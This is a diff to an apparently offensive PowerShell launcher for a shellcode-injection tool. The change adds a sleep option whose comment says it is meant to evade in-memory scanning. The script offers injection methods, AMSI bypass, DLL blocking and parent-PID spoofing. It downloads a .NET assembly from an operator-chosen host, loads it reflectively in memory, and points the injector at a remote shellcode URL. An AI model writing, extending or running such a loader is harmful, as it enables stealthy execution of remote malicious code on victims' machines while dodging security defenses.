@@ -59,6 +59,9 @@ $M = "True"
 # bypass AMSI ("True" / "False")
 $N = "True"
 
+# number of seconds (approx.) to sleep before execution to evade in-memory scan (for values greater than "60" it will take much longer to sleep)
+$O = "0"
+
 # --------------------------------------------------------------------
 
 $methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended", "remotethreadkernelcb")
@@ -80,7 +83,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /blockDlls:${M} /am51:${N}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /blockDlls:${M} /am51:${N} /sleep:${O}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
